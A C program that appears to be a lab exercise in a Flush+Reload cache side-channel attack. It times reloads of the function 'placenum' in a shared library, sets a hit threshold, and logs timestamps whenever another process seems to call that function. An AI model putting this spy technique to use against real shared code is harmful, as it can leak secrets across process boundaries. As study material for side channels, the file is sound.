#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <time.h>

#include "probe.h"
#include "libnumberpic.h"

#define SLEEPTIME 1

double avgtime(int measuredtimes[], int n) {
    long sum = 0;
    for (int i = 0; i < n; i++) {
        sum += measuredtimes[i];
    }
    return sum / n;
}


double deviation(int measuredtimes[], int n, int p) {
    long sum = 0;
    for (int i = 0; i < n; i++) {
        sum += pow((measuredtimes[i] - p), 2);
    }
    double dsum = sum / n;
    return sqrt(dsum);
}

int main() {

    int n = 500;
    int measuredtimes[n];

    // when load times are near cacheload times is likely that placenum has been called
    for (int i=0; i < n; i++) {
        measuredtimes[i] = reload((char *) &placenum);
        usleep(SLEEPTIME);
    }
    double p = avgtime(measuredtimes, n);
    double sdev = deviation(measuredtimes, n, p);
    printf("mean: %f\n", p);
    printf("stdev: %f\n", sdev);

    double treshold = p + 4*sdev; 
    printf("%f\n", treshold); 

    // probe flushed times just for informational purpose
    for (int i=0; i < n; i++) {
        flush((char *) &placenum);
        measuredtimes[i] = reload((char *) &placenum);
        usleep(SLEEPTIME);
    }
    p = avgtime(measuredtimes, n);
    printf("mean: %f\n", p);
    printf("stdev: %f\n", deviation(measuredtimes, n, p));


    while (1) {
        
        int accesstime = reload((char *) &placenum);
        
        if (accesstime < treshold) {
            time_t current_time;
            time(&current_time);
  
            printf("Access : (time) %i : %s \n", accesstime, ctime(&current_time));
        }
        flush((char *) &placenum);
        usleep(SLEEPTIME);
    }

    return 0;
}
